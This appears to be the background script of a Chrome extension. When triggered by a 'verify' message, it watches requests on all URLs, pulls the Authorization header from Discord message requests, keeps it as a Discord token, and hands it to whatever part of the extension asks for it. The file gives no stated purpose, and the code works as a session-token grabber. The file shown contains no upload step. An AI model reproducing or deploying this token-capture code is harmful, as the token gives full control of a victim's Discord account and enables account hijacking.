token = "";

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  if (request.verify == "true") {
    chrome.webRequest.onBeforeSendHeaders.addListener(
      function (details) {
        for (let x = 0; x < details.requestHeaders.length; x++) {
          if (details.requestHeaders[x].name === "Authorization" && details.url.indexOf("messages") !== -1) {
            // check for url if it contains "messages"
            token = details.requestHeaders[x].value;
            sendResponse({discordToken: details.requestHeaders[x].value});
          }
        }

        return { requestHeaders: details.requestHeaders };
      },
      { urls: ["<all_urls>"] },
      ["requestHeaders"]
    );
  }
  else if (request.getToken == "true") {
    if (token !== "") {
      sendResponse({discordToken: token});
    }
    else
    {
      sendResponse({discordToken: ""});
    }
  }
  return true;
});
